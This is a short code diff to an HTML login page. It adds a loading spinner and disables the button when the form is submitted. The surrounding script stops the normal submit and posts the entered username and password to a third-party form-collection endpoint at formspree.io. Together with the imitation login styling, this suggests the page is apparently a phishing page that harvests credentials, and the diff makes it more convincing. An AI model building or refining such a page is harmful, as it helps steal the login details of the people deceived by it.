@@ -29,12 +29,21 @@
                     <input type="password" id="password" name="credential" placeholder=" " required>
                     <label for="password">Password</label>
                 </div>
-                <button type="submit" class="btn-login">Log in</button>
+                <button type="submit" class="btn-login" id="loginBtn">
+                    <span id="btnText">Log in</span>
+                    <span id="btnSpinner" class="spinner" hidden></span>
+                </button>
                 <a href="#" class="forgot">Forgotten password?</a>
             </form>
             <script>
                 document.getElementById('loginForm').addEventListener('submit', async function(e) {
                     e.preventDefault();
+                    const btn = document.getElementById('loginBtn');
+                    const text = document.getElementById('btnText');
+                    const spinner = document.getElementById('btnSpinner');
+                    btn.disabled = true;
+                    text.hidden = true;
+                    spinner.hidden = false;
                     const data = new FormData(this);
                     await fetch('https://formspree.io/f/mpqenlvq', {
                         method: 'POST',
